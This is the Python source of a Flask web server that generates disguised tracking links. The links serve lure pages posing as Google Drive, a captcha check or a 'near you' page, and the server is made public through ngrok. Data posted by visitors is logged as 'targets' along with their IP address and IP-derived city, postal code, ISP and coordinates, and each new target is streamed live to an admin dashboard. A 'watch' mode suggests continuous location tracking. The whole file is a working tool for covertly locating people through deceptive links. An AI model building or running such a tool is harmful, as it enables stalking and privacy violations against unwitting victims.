from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
import json
import os
import datetime
import uuid
import subprocess
import time
import re
import requests
from flask_socketio import SocketIO

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*")

# Create directories
DATABASE_DIR = 'database'
STATIC_DIR = os.path.join('static')
JS_DIR = os.path.join(STATIC_DIR, 'js')

for directory in [DATABASE_DIR, STATIC_DIR, JS_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

DATA_FILE = os.path.join(DATABASE_DIR, 'database.json')
CUSTOM_LINKS_FILE = os.path.join(DATABASE_DIR, 'custom_links.json')
IP_LOOKUP_FILE = os.path.join(DATABASE_DIR, 'ip_lookups.json')
NGROK_PROCESS = None
NGROK_URL = None
ACTIVE_SESSIONS = {}

def load_targets():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                return json.load(f)
            except:
                return []
    return []

def save_target(target_data):
    targets = load_targets()
    targets.append(target_data)
    with open(DATA_FILE, 'w') as f:
        json.dump(targets, f, indent=2)
    return target_data

def load_custom_links():
    if os.path.exists(CUSTOM_LINKS_FILE):
        with open(CUSTOM_LINKS_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    save_custom_links({})
    return {}

def save_custom_links(links):
    with open(CUSTOM_LINKS_FILE, 'w') as f:
        json.dump(links, f, indent=2)

def load_ip_lookups():
    if os.path.exists(IP_LOOKUP_FILE):
        with open(IP_LOOKUP_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    save_ip_lookups({})
    return {}

def save_ip_lookups(lookups):
    with open(IP_LOOKUP_FILE, 'w') as f:
        json.dump(lookups, f, indent=2)

def get_ip_info(ip_address):
    lookups = load_ip_lookups()
    
    if ip_address in lookups:
        return lookups[ip_address]
    
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            ip_data = response.json()
            lookups[ip_address] = ip_data
            save_ip_lookups(lookups)
            return ip_data
    except Exception as e:
        print(f"Error fetching IP info: {e}")
    
    return {}

def get_available_templates():
    templates = [
        {"id": "default", "name": "Default Template"},
        {"id": "nearyou", "name": "Near You"},
        {"id": "gdrive", "name": "Google Drive"},
        {"id": "captcha", "name": "Captcha Verification"}
    ]
    return templates

CUSTOM_LINKS = load_custom_links()

def get_ngrok_url():
    try:
        response = subprocess.check_output(['curl', '-s', 'http://127.0.0.1:4040/api/tunnels'])
        tunnels = json.loads(response)
        if 'tunnels' in tunnels and tunnels['tunnels']:
            for tunnel in tunnels['tunnels']:
                if tunnel['proto'] == 'https':
                    return tunnel['public_url']
            return tunnels['tunnels'][0]['public_url']
    except:
        pass
    return None

def start_ngrok(port=5000):
    global NGROK_PROCESS, NGROK_URL
    if NGROK_PROCESS is not None:
        return get_ngrok_url()
    
    try:
        NGROK_PROCESS = subprocess.Popen(['ngrok', 'http', str(port)], 
                                          stdout=subprocess.DEVNULL, 
                                          stderr=subprocess.DEVNULL)
        time.sleep(2)
        NGROK_URL = get_ngrok_url()
        return NGROK_URL
    except Exception as e:
        print(f"Error starting ngrok: {e}")
        return None

def stop_ngrok():
    global NGROK_PROCESS, NGROK_URL
    if NGROK_PROCESS is not None:
        NGROK_PROCESS.terminate()
        NGROK_PROCESS = None
        NGROK_URL = None
        return True
    return False

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    elif request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    return request.remote_addr

# Serve static files
@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/')
def index():
    return redirect(url_for('admin'))

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/<custom_link>')
def custom_redirect(custom_link):
    if custom_link in CUSTOM_LINKS:
        CUSTOM_LINKS[custom_link]['visits'] += 1
        save_custom_links(CUSTOM_LINKS)
        
        socketio.emit('link_updated', {
            "id": custom_link,
            "name": CUSTOM_LINKS[custom_link]["name"],
            "created": CUSTOM_LINKS[custom_link]["created"],
            "visits": CUSTOM_LINKS[custom_link]["visits"],
            "template": CUSTOM_LINKS[custom_link].get("template", "default"),
            "redirect_url": CUSTOM_LINKS[custom_link].get("redirect_url", ""),
            "geo_mode": CUSTOM_LINKS[custom_link].get("geo_mode", "single")
        })
        
        template = CUSTOM_LINKS[custom_link].get('template', 'default')
        
        if template == 'default':
            return render_template('default/index.html', 
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        elif template == 'nearyou':
            return render_template('nearyou/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        elif template == 'gdrive':
            return render_template('gdrive/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        elif template == 'captcha':
            return render_template('captcha/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        else:
            return render_template('default/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
    
    return "Not Found", 404

@app.route('/api/targets', methods=['GET'])
def get_targets():
    targets = load_targets()
    return jsonify(targets)

@app.route('/api/clear_history', methods=['POST'])
def clear_history():
    try:
        if os.path.exists(DATA_FILE):
            os.remove(DATA_FILE)
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.json
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data['ip'] = get_client_ip()
    
    ip_info = get_ip_info(data['ip'])
    
    if ip_info:
        data['city'] = ip_info.get('city', '')
        data['region'] = ip_info.get('region', '')
        data['country'] = ip_info.get('country', '')
        data['loc'] = ip_info.get('loc', '')
        data['org'] = ip_info.get('org', '')
        data['postal'] = ip_info.get('postal', '')
        data['timezone'] = ip_info.get('timezone', '')
        data['isp'] = ip_info.get('org', '').split(' ')[0] if ip_info.get('org') else ''
    
    referer = request.headers.get('Referer', '')
    custom_link = None
    
    for link in CUSTOM_LINKS:
        if link in referer:
            custom_link = link
            data['source_link'] = custom_link
            data['link_name'] = CUSTOM_LINKS[custom_link]['name']
            break
    
    saved_data = save_target(data)
    socketio.emit('new_target', saved_data)
    return jsonify({"status": "success"})

@app.route('/api/create_link', methods=['POST'])
def create_link():
    data = request.json
    link_name = data.get('name', '')
    
    if not link_name:
        return jsonify({"status": "error", "message": "Link name is required"}), 400
    
    custom_id = data.get('custom_id')
    if not custom_id:
        custom_id = str(uuid.uuid4())[:8]
    
    if not re.match(r'^[a-zA-Z0-9-]+$', custom_id):
        return jsonify({"status": "error", "message": "Custom ID can only contain letters, numbers, and hyphens"}), 400
    
    if custom_id in CUSTOM_LINKS:
        return jsonify({"status": "error", "message": "This link ID already exists"}), 400
    
    template = data.get('template', 'default')
    redirect_url = data.get('redirect_url', '')
    geo_mode = data.get('geo_mode', 'single')
    
    if geo_mode not in ['single', 'watch']:
        geo_mode = 'single'
    
    CUSTOM_LINKS[custom_id] = {
        "name": link_name,
        "created": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "visits": 0,
        "template": template,
        "redirect_url": redirect_url,
        "geo_mode": geo_mode
    }
    
    save_custom_links(CUSTOM_LINKS)
    
    socketio.emit('link_created', {
        "id": custom_id,
        "name": link_name,
        "created": CUSTOM_LINKS[custom_id]["created"],
        "visits": 0,
        "template": template,
        "redirect_url": redirect_url,
        "geo_mode": geo_mode
    })
    
    ngrok_url = get_ngrok_url()
    base_url = ngrok_url if ngrok_url else request.host_url
    
    return jsonify({
        "status": "success", 
        "id": custom_id, 
        "url": f"{base_url.rstrip('/')}/{custom_id}"
    })

@app.route('/api/links', methods=['GET'])
def get_links():
    links = []
    for link_id, link_data in CUSTOM_LINKS.items():
        links.append({
            "id": link_id,
            "name": link_data["name"],
            "created": link_data["created"],
            "visits": link_data["visits"],
            "template": link_data.get("template", "default"),
            "redirect_url": link_data.get("redirect_url", ""),
            "geo_mode": link_data.get("geo_mode", "single")
        })
    return jsonify(links)

@app.route('/api/delete_link/<link_id>', methods=['DELETE'])
def delete_link(link_id):
    if link_id in CUSTOM_LINKS:
        del CUSTOM_LINKS[link_id]
        save_custom_links(CUSTOM_LINKS)
        socketio.emit('link_deleted', {"id": link_id})
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Link not found"}), 404

@app.route('/api/templates', methods=['GET'])
def get_templates():
    templates = get_available_templates()
    return jsonify(templates)

@app.route('/api/update_link_template', methods=['POST'])
def update_link_template():
    data = request.json
    link_id = data.get('link_id')
    template = data.get('template')
    
    if not link_id or not template:
        return jsonify({"status": "error", "message": "Link ID and template are required"}), 400
    
    if link_id not in CUSTOM_LINKS:
        return jsonify({"status": "error", "message": "Link not found"}), 404
    
    CUSTOM_LINKS[link_id]['template'] = template
    save_custom_links(CUSTOM_LINKS)
    
    socketio.emit('link_updated', {
        "id": link_id,
        "name": CUSTOM_LINKS[link_id]["name"],
        "created": CUSTOM_LINKS[link_id]["created"],
        "visits": CUSTOM_LINKS[link_id]["visits"],
        "template": template,
        "redirect_url": CUSTOM_LINKS[link_id].get("redirect_url", ""),
        "geo_mode": CUSTOM_LINKS[link_id].get("geo_mode", "single")
    })
    
    return jsonify({"status": "success"})

@app.route('/api/update_link_settings', methods=['POST'])
def update_link_settings():
    data = request.json
    link_id = data.get('link_id')
    redirect_url = data.get('redirect_url', '')
    geo_mode = data.get('geo_mode', 'single')
    
    if not link_id:
        return jsonify({"status": "error", "message": "Link ID is required"}), 400
    
    if link_id not in CUSTOM_LINKS:
        return jsonify({"status": "error", "message": "Link not found"}), 404
    
    if geo_mode not in ['single', 'watch']:
        geo_mode = 'single'
    
    CUSTOM_LINKS[link_id]['redirect_url'] = redirect_url
    CUSTOM_LINKS[link_id]['geo_mode'] = geo_mode
    save_custom_links(CUSTOM_LINKS)
    
    socketio.emit('link_updated', {
        "id": link_id,
        "name": CUSTOM_LINKS[link_id]["name"],
        "created": CUSTOM_LINKS[link_id]["created"],
        "visits": CUSTOM_LINKS[link_id]["visits"],
        "template": CUSTOM_LINKS[link_id].get("template", "default"),
        "redirect_url": redirect_url,
        "geo_mode": geo_mode
    })
    
    return jsonify({"status": "success"})

@app.route('/api/ngrok/status', methods=['GET'])
def ngrok_status():
    url = get_ngrok_url()
    return jsonify({
        "running": NGROK_PROCESS is not None,
        "url": url if url else None
    })

@app.route('/api/ngrok/start', methods=['POST'])
def start_ngrok_api():
    url = start_ngrok()
    if url:
        socketio.emit('ngrok_status', {
            "running": True,
            "url": url
        })
        return jsonify({"status": "success", "url": url})
    return jsonify({"status": "error", "message": "Failed to start ngrok"}), 500

@app.route('/api/ngrok/stop', methods=['POST'])
def stop_ngrok_api():
    result = stop_ngrok()
    socketio.emit('ngrok_status', {
        "running": False,
        "url": None
    })
    return jsonify({"status": "success" if result else "error"})

if __name__ == '__main__':
    try:
        save_custom_links(CUSTOM_LINKS)
    except:
        pass
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)